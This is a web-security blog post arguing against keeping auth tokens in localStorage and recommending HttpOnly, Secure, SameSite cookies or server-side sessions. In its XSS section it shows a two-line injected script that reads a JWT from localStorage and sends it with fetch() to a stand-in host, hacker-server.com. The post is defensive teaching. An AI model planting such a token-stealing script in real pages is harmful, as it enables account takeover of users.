---
title: Do Not Use LocalStorage To Save Session and Auth Tokens(Or Any Sensitive Information.)
description: An in-depth look at the security risks inherent in using localStorage to store sensitive informations and robust alternatives that ensure user data is protected.
slug: do-not-use-localstorage-to-save-session-and-auth-tokens
# image: localstorage-token.png
categories:
  - web-application-security
tags:
  - Authentication
  - Web Application Security
  - LocalStorage
weight: 1 # You can add weight to some posts to override the default sorting (date descending)
---

# Why using LocalStorage to save sensitive information is UNACCEPTABLE in 2025

Let's be clear. It's 2025. If you, as a developer, are still saving authentication tokens or any other sensitive information in localStorage, you're doing it wrong. Period.

I'm deeply irritated by the number of tutorials, bootcamps, and articles that perpetuate this ridiculous practice. It's a disservice to our profession and a wide-open door to vulnerabilities that should have been eliminated long ago. There's no longer any excuse for making this mistake.

This article isn't a debate. It's an eviction order for an insecure practice. If you teach this, stop.

## First Things First: What is LocalStorage?

It's a browser storage API. A simple JavaScript object where you throw key-value pairs. The end. It's designed to store trivial things, like a user's preference for a dark theme. Not to store the key to a safe. Using it for tokens is like writing down your bank password on a Post-it note and sticking it on your forehead.

# What sucks about localStorage? (Besides security)

Before we even get into the security debacle, localStorage is a technically poor tool for modern web development.

- **Blocks the Damn Main Thread**: It's synchronous. Every **getItem** or **setItem** locks up the UI. While the browser reads from disk, your application freezes. In 2025, with the obsession with performance and 60fps, using a synchronous API for I/O is just plain stupid.
- **Only Storage Garbage (Strings)**: It doesn't store objects. You're forced to do the JSON.stringify() and JSON.parse() nonsense for everything, adding useless code and potential points of failure. It's primitive.
- **Doesn't Talk to Web Workers**: Need to do heavy background processing to avoid crashing the page? Great. But your Web Workers don't have access to localStorage. It's useless for any minimally sophisticated architecture that requires shared state with background threads.
- **Single Origin**: localStorage is locked to the exact origin. `app.site.com` can't read what `api.site.com` has stored. For authentication that needs to work across subdomains, it dies here.

For these reasons alone, he would be a poor choice. But now, let's get to the main crime.

# The Deadly Sin: Cross-Site Scripting (XSS)

This is why any senior developer will laugh at you (or fire you) if you use localStorage for tokens.

Any script injected into your page has full and unrestricted access to localStorage. **ANY SCRIPT**.

An XSS attack occurs when an attacker manages to inject a piece of JavaScript into your application. A malicious comment, an unhandled URL parameter, any slip-up. And all it takes is one line:

```javascript
// malicious actor script injected into your page
const stolenToken = localStorage.getItem('jwt_token');

// send to the server (c2, etc.)
fetch(`https://hacker-server.com/stolen-token?token=?token=${stolenToken}`);
```

GAME OVER.

The attacker has the token. They are now your user. They can access data, make purchases, transfer money, and delete the account. And it's your fault for leaving the key under the rug. Trusting that your application is 100% XSS-proof is the height of arrogance.

# The Obvious Solution They Ignore: Cookies

The solution isn't new, it's not sexy, but it's the right one and has worked for decades: cookies. But not just any cookie thrown in. Cookies configured like a pro.

When your backend generates a token, it must enclose it in a cookie with three MANDATORY flags:

- `HttpOnly`: The most important. It makes the cookie **INACCESSIBLE** to client-side JavaScript. `document.cookie` simply doesn't see this cookie. The XSS attack we described becomes useless. The attacker's script tries to read it and finds nothing. Problem solved.
- `Secure`: Ensures that the cookie only travels over HTTPS. This prevents anyone in the middle (on a public Wi-Fi network, for example) from reading the cookie in plain text. This is basic digital hygiene.
- `SameSite=Strict (or Lax)`: Your weapon against **CSRF (Cross-Site Request Forgery)** attacks. Prevents the browser from sending the cookie in requests from other sites, preventing a user from being tricked into performing actions without knowing.

Your response header should look like this, no excuses:

`Set-Cookie: session_token=YOUR_TOKEN_HERE; HttpOnly; Secure; SameSite=Strict`

# Classic Alternative: Server Sessions

If you don't like JWTs or have a more traditional application, use the time-tested and proven method: server-side sessions.

In this model, the server stores all sensitive data and sends only a random session ID to the client, inside a cookie with the same flags (HttpOnly, Secure, SameSite).

# No More Excuses

Your job isn't to do the easiest thing, it's to do the right thing. Safety isn't a luxury; it's the foundation.

- **NEVER** use localStorage for tokens or any sensitive data.
- **ALWAYS** use cookies.
- Your cookie **MUST** have the HttpOnly, Secure, and SameSite attributes.
- Choose between Server-Side Sessions (stateful) or JWTs in Cookies (stateless) depending on your architecture.